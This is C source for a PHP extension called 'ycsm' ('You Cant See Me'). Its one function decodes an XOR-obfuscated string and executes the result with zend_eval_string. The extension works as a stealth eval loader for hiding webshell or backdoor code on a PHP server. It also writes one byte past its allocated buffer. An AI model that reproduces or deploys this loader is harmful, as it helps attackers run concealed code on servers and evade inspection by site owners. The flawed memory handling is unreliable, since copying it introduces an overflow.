#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "Zend/zend_alloc.h"
#include "php_ycsm.h"

#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
	ZEND_PARSE_PARAMETERS_START(0, 0) \
	ZEND_PARSE_PARAMETERS_END()
#endif

PHP_FUNCTION(ycsm_run) {
	char *EncStr;
	char *ptr;
	unsigned long i;

    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &EncStr) == FAILURE) {
        php_printf("What The Hell?? We need Input!\n");
        return;
    }
	ptr = EncStr;
	ptr = emalloc(strlen(EncStr));
	for(i=0;i<strlen(EncStr);i++)
	{
		ptr[i] = (EncStr[i]^'b')-5;
	}
	ptr[strlen(EncStr)] = '\0';
	zend_eval_string(ptr, NULL, "You Cant See Me PHP Extention");
	efree(ptr);
	RETURN_NULL();

}

/////////////////////////////////////////////////////////
PHP_RINIT_FUNCTION(ycsm)
{
#if defined(ZTS) && defined(COMPILE_DL_YCSM)
	ZEND_TSRMLS_CACHE_UPDATE();
#endif

	return SUCCESS;
}

PHP_MINFO_FUNCTION(ycsm)
{
	php_info_print_table_start();
	php_info_print_table_end();
}
ZEND_BEGIN_ARG_INFO(arginfo_ycsm_run, 0)
ZEND_END_ARG_INFO()

static const zend_function_entry ycsm_functions[] = {
	PHP_FE(ycsm_run,		arginfo_ycsm_run)
	PHP_FE_END
};

zend_module_entry ycsm_module_entry = {
	STANDARD_MODULE_HEADER,
	"ycsm",					/* Extension name */
	ycsm_functions,			/* zend_function_entry */
	NULL,							/* PHP_MINIT - Module initialization */
	NULL,							/* PHP_MSHUTDOWN - Module shutdown */
	PHP_RINIT(ycsm),			/* PHP_RINIT - Request initialization */
	NULL,							/* PHP_RSHUTDOWN - Request shutdown */
	PHP_MINFO(ycsm),			/* PHP_MINFO - Module info */
	PHP_YCSM_VERSION,		/* Version */
	STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_YCSM
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(ycsm)
#endif
